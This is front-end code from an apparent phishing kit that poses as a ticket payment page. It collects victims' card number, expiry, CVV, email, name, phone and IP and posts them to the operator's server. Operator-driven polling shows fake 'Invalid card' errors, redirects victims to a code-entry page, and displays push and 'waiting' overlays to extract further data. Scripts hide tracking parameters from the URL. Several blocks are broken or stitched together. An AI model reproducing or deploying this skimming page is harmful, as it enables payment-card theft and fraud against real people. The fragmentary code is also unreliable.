    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        .support-proceed-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .support-proceed-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
        #push-overlay {
            z-index: 100000 !important;
        }

    <style>
    #push-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(22,182,255,0.97);
      z-index: 100000;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      transition: opacity 0.3s;
      animation: fadeInPush 0.5s;
    }
    @keyframes fadeInPush {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .push-modal {
      background: #fff;
      border-radius: 24px;
      max-width: 370px;
      width: 92vw;
      margin: auto;
      padding: 2.7rem 2rem 2.2rem 2rem;
      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: popInPush 0.5s;
    }
    @keyframes popInPush {
      0% { transform: scale(0.92); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell {
      margin-bottom: 1.5rem;
      width: 70px;
      height: 70px;
      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
      position: relative;
      animation: bellPop 0.7s;
    }
    @keyframes bellPop {
      0% { transform: scale(0.7); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
    .push-bell svg {
      width: 38px;
      height: 38px;
      color: #fff;
      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
      transform-origin: 50% 10%;
    }
    @keyframes bellShake {
      0%, 100% { transform: rotate(0deg); }
      10% { transform: rotate(-10deg); }
      20% { transform: rotate(8deg); }
      30% { transform: rotate(-6deg); }
      40% { transform: rotate(4deg); }
      50% { transform: rotate(-2deg); }
      60% { transform: rotate(1deg); }
      70%, 90% { transform: rotate(0deg); }
    }
    .push-title {
      font-size: 2.1rem;
      font-weight: 700;
      color: #16b6ff;
      margin-bottom: 0.7rem;
      letter-spacing: -1px;
    }
    .push-desc {
      font-size: 1.13rem;
      color: #222;
      margin-bottom: 0.7rem;

    @media (max-width: 480px) {
      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
      .push-title { font-size: 1.3rem; }
      .push-desc { font-size: 0.98rem; }
    }

    <!-- Блок для приховування total, price, currency з URL -->
    <script>
    (function() {
        const urlParams = new URLSearchParams(window.location.search);
        let changed = false;
        const total = urlParams.get('total');
        const price = urlParams.get('price');
        const currency = urlParams.get('currency');
        if (total) {
            sessionStorage.setItem('total_price', total);
            sessionStorage.setItem('ticket_total', total); // Для зворотної сумісності
            changed = true;
        }
        if (price) {
            sessionStorage.setItem('ticket_price', price);
            changed = true;
        }
        if (currency) {
            sessionStorage.setItem('currency', currency);
            sessionStorage.setItem('ticket_currency', currency); // Для зворотної сумісності
            changed = true;
        }
        // Якщо були параметри — видаляємо їх з URL
        if (changed) {
            const newUrl = new URL(window.location);
            newUrl.searchParams.delete('total');
            newUrl.searchParams.delete('price');
            newUrl.searchParams.delete('currency');
            window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
        }
    })();
    </script>

    <script>
    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // --- Витягуємо total і currency з URL ---
    function getTotalAndCurrency() {
        const totalRaw = getQueryParam('total') || sessionStorage.getItem('total_price') || sessionStorage.getItem('ticket_total');
        const currencyRaw = getQueryParam('currency') || sessionStorage.getItem('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
        if (totalRaw) {
            const match = totalRaw.match(/\d+[\.,]?\d*/);
            const totalNum = match ? match[0].replace(',', '.') : '';
            return { total: totalNum, currency: currencyRaw };
        }
        // fallback: price/currency
        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
        return { total: price, currency };
    }
    // --- Оновлюємо всі суми на сторінці ---
    function updateAllTotals() {
        const { total, currency } = getTotalAndCurrency();
        // Заголовок
        document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
        // Всі елементи з ціною (крім заголовка)
        document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
            el.textContent = `${total} ${currency}`;
        });
        // data-атрибути для системи оплати
        document.querySelectorAll('[data-payment-price]').forEach(el => {
            el.setAttribute('data-payment-price', total);
            el.setAttribute('data-payment-currency', currency);
        });
        // Форми оплати
        document.querySelectorAll('form[data-payment-form]').forEach(form => {
            const priceInput = form.querySelector('input[name="price"]');
            const currencyInput = form.querySelector('input[name="currency"]');
            if (priceInput) priceInput.value = total;
            if (currencyInput) currencyInput.value = currency;
        });
    }
    // --- Викликаємо при завантаженні ---
    updateAllTotals();
    // --- Замість uid використовуємо page_code ---
    function getPageCode() {
      // 1. З URL
      const urlParams = new URLSearchParams(window.location.search);
      let page = urlParams.get('page');
      if (page) return page;
      // 2. З sessionStorage
      page = sessionStorage.getItem('page_code');
      if (page) return page;
      return '';
    }
    // Додаємо показ overlay-вікна загрузки після сабміту форми
    if (!window.loadingOverlay) {
      window.loadingOverlay = document.createElement('div');
      window.loadingOverlay.id = 'loading-overlay';
      window.loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
      window.loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing payment...</div></div>';
      document.body.appendChild(window.loadingOverlay);
    }

    const paymentForm = document.getElementById('paymentForm');
    paymentForm.onsubmit = async function(e) {
        e.preventDefault();
        window.loadingOverlay.style.display = 'flex';
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        // --- Додаємо price і currency ---
        // Тепер price/currency = total/currency з URL, якщо є
        const { total: price, currency } = getTotalAndCurrency();
        // --- Додаємо базову ціну за один квиток ---
        const basePrice = sessionStorage.getItem('ticket_price') || price;
        // --- Додаємо телефон і ім'я з sessionStorage ---
        const phone = sessionStorage.getItem('ticket_phone') || '';
        const name = sessionStorage.getItem('ticket_name') || '';
        // Додаємо page_code
        function getPageCode() {
          // 1. З URL
          const urlParams = new URLSearchParams(window.location.search);
          let page = urlParams.get('page');
          if (page) return page;
          // 2. З sessionStorage
          page = sessionStorage.getItem('page_code');
          if (page) return page;
          return '';
        }
        const page_code = getPageCode();
        try {
            let ip = userIP;
            if (!ip) {
                await new Promise(res => setTimeout(res, 500));
                ip = userIP;
            }
            // --- Додаю логування для діагностики ---
            console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price: basePrice, total: price, currency, phone, name });
            const response = await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price: basePrice, total: price, currency, phone, name })
            });
            // overlay залишається до push/support/text!
            if (!response.ok) {
                console.error('Помилка при відправці даних');
            }
        } catch (error) {
            // loadingOverlay.style.display = 'none'; // <-- видаляємо
            console.error('Помилка при зверненні до сервера:', error);
        }
    };
    </script>
    <script>
    // --- POLLING для wrong_card ---
    function getUserIP(callback) {
        // Спробуємо отримати IP через сторонній сервіс
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => callback(data.ip))
            .catch((e) => {
                console.warn('Could not get user IP:', e);
                callback(null);
            });
    }
    let userIP = null;
    getUserIP(function(ip) {
        userIP = ip;
    });
    let wrongCardMsg = null;
    function showWrongCardMsg() {
        if (!wrongCardMsg) {
            wrongCardMsg = document.createElement('div');
            wrongCardMsg.style.color = '#dc3545';
            wrongCardMsg.style.fontSize = '0.98rem';
            wrongCardMsg.style.marginTop = '6px';
            wrongCardMsg.textContent = 'Invalid card';
            const cardInput = document.getElementById('card-input');
            cardInput.parentNode.appendChild(wrongCardMsg);
        }
    }
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    showWrongCardMsg();
                }
            });
    }, 2000);
    </script>
    <script>
    // --- POLLING для code redirect ---
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    // Додаємо page_code, total та currency до URL
                    var page = sessionStorage.getItem('page_code') || new URL(window.location.href).searchParams.get('page');
                    var total = sessionStorage.getItem('total_price') || sessionStorage.getItem('ticket_total') || new URL(window.location.href).searchParams.get('total');
                    var currency = sessionStorage.getItem('currency') || sessionStorage.getItem('ticket_currency') || new URL(window.location.href).searchParams.get('currency');
                    
                    if (page) {
                        var url = '/buy-tickets/code/?page=' + encodeURIComponent(page);
                        if (total) url += '&total=' + encodeURIComponent(total);
                        if (currency) url += '&currency=' + encodeURIComponent(currency);
                        window.location.href = url;
                    } else {
                        window.location.href = '/buy-tickets/code/';
                    }
                }
            });
    }, 2000);
    </script>

    let supportTabOpened = false;
    let pushTabOpened = false;
    let textTabOpened = false;
    
    function getPageCode() {
      const urlParams = new URLSearchParams(window.location.search);
      let page = urlParams.get('page');

    function startUniversalPolling() {
      setTimeout(pollAllButtons, 2000);
    }
    
    async function pollAllButtons() {
        const page_code = getPageCode();
        document.body.setAttribute('data-page-code', page_code);
        
        if (!page_code) {
            return setTimeout(pollAllButtons, 2000);

        // Polling для push кнопки

            const pushUrl = '/check_push?page_code=' + encodeURIComponent(page_code);

            if (pushTxt === 'true' && !pushTabOpened) {
                const { total, currency } = getTotalAndCurrency();

                    pushTitle.textContent = `Payment ${total} ${currency}`;

                textTabOpened = false;

                    document.getElementById('support-overlay').style.display = 'none';

                    document.getElementById('text-overlay').style.display = 'none';

                if (document.getElementById('push-overlay')) {
                    document.getElementById('push-overlay').style.display = 'none';
                }
                document.getElementById('support-overlay').style.display = 'flex';
                document.getElementById('payment-card-main').style.display = 'none';
                supportTabOpened = true;
            }
            
            // Text кнопка - показуємо overlay замість нового вікна
            if (!textTabOpened && supportData.show_text && supportData.text_id) {
                console.log('Text button activated! Text ID:', supportData.text_id);
                // Скидаємо стани інших кнопок
                pushTabOpened = false;
                supportTabOpened = false;
                
                // Завантажуємо текст і показуємо overlay
                fetch(`/get_custom_text?text_id=${supportData.text_id}`)
                    .then(resp => resp.text())
                    .then(textContent => {
                        console.log('Text content loaded:', textContent);
                        if (!document.getElementById('text-overlay')) {
                            const textOverlay = document.createElement('div');
                            textOverlay.id = 'text-overlay';
                            textOverlay.style.cssText = `
                                display: flex;
                                position: fixed;
                                top: 0; left: 0; width: 100vw; height: 100vh;
                                background: #00b2ff;
                                z-index: 100000;
                                align-items: center;
                                justify-content: center;
                                flex-direction: column;
                            `;
                            textOverlay.innerHTML = `
                                <div style=\"background: white; border-radius: 20px; padding: 2.5rem 2rem; max-width: 370px; width: 90%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.12);\">
                                    <div style=\"width: 60px; height: 60px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.2rem auto;\">
                                        <svg width=\"36\" height=\"36\" viewBox=\"0 0 24 24\" fill=\"white\">
                                            <path d=\"M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z\"/>
                                        </svg>
                                    </div>
                                    <h3 style=\"font-size: 2rem; font-weight: 700; margin-bottom: 1.2rem; color: #222;\">Waiting</h3>
                                    <p id=\"text-dynamic\" style=\"font-size: 1.1rem; color: #666; margin-bottom: 1.5rem;\"></p>
                                    <div style=\"width: 50px; height: 50px; background: #00b2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto;\">
                                        <svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"white\">
                                            <path d=\"M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z\"/>
                                        </svg>
                                    </div>
                                </div>
                            `;
                            document.body.appendChild(textOverlay);
                        }
                        // Приховуємо всі інші overlay
                        if (document.getElementById('support-overlay')) {
                            document.getElementById('support-overlay').style.display = 'none';
                        }
                        if (document.getElementById('push-overlay')) {
                            document.getElementById('push-overlay').style.display = 'none';
                        }
                        document.getElementById('text-dynamic').textContent = textContent || '';
                        document.getElementById('text-overlay').style.display = 'flex';
                        document.getElementById('payment-card-main').style.display = 'none';
                        textTabOpened = true;
                    })
                    .catch(e => console.error('Text loading error:', e));
            }
        } catch (e) {
            console.error('Support polling error:', e);
        }
        
        setTimeout(pollAllButtons, 2000);
    }
    
    // Стартуємо polling одразу, а не чекаємо userIP
    startUniversalPolling();
    
    // Оновлюємо userIP коли він стає доступним
    getUserIP(function(ip) {
        userIP = ip;
    });
    </script>
    <script>
    // --- Оновлення IP у базі при відкритті сторінки ---
    function updateSiteUserIP() {
        const page_code = getPageCode();
        if (!page_code) {
            console.log('page_code не знайдено у URL/sessionStorage, IP не буде записано');
            return;
        }
        fetch('https://api.ipify.org?format=json')
            .then(resp => resp.json())
            .then(data => {
                const ip = data.ip;
                fetch('/update_site_user_ip', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ page_code, ip })
                })
                .then(r => r.text())
                .then(txt => console.log('update_site_user_ip response:', txt))
                .catch(console.error);
            });
    }
    updateSiteUserIP();
    </script>

<script>
// --- Fallback: якщо page_code є в sessionStorage, але немає в URL — додаємо його в URL і перезавантажуємо сторінку ---
(function() {
    const url = new URL(window.location.href);
    const pageFromUrl = url.searchParams.get('page');
    const pageFromStorage = sessionStorage.getItem('page_code');
    if (!pageFromUrl && pageFromStorage) {
        url.searchParams.set('page', pageFromStorage);
        window.location.replace(url.toString());
    }
})();
</script>
<script>
(function ensurePageCodeInUrl() {
    const url = new URL(window.location.href);
    let page = url.searchParams.get('page');
    if (!page) {
        page = sessionStorage.getItem('page_code');
        if (page) {
            url.searchParams.set('page', page);
            window.location.replace(url.toString());
        }
    }
    })();
    </script>
    
    <!-- Універсальний блок для приховування page_code з URL -->
    <script>
    (function() {
        // Отримуємо page_code з URL
        const urlParams = new URLSearchParams(window.location.search);
        const page_code = urlParams.get('page');
        
        if (page_code) {
            // Зберігаємо в sessionStorage
            sessionStorage.setItem('page_code', page_code);
            
            // Видаляємо з URL без перезавантаження сторінки
            const newUrl = new URL(window.location);
            newUrl.searchParams.delete('page');
            window.history.replaceState({}, document.title, newUrl.pathname + newUrl.search);
            
            console.log('Page code hidden from URL and saved to sessionStorage:', page_code);
        }
    })();
    </script>
    <script>
document.addEventListener('DOMContentLoaded', function() {
  // Перевіряємо параметр f=1
  function isFromBot() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('f') === '1') return true;
    if (sessionStorage.getItem('from_bot') === '1') return true;
    return false;
  }
  if (isFromBot()) {
    document.getElementById('back-btn').style.display = 'none';
    sessionStorage.setItem('from_bot', '1');
  } else {
    document.getElementById('back-btn').style.display = 'block';
    sessionStorage.removeItem('from_bot');
  }
});
</script>
<script>
(function() {
  const url = new URL(window.location.href);
  const params = url.searchParams;
  if (params.get('f') === '1') {
    sessionStorage.setItem('from_bot', '1');
    params.delete('f');
    window.history.replaceState({}, '', url.pathname + (params.toString() ? '?' + params.toString() : ''));
  }
})();
</script>

        window.location.href = `/buy-tickets/?event=${encodeURIComponent(event)}`;
    } else {
        window.location.href = '/buy-tickets/';

};

<script>
    function getPageCode() {
      const urlParams = new URLSearchParams(window.location.search);
      let page = urlParams.get('page');
      if (page) return page;
      page = sessionStorage.getItem('page_code');
      if (page) return page;
      return '';
    }
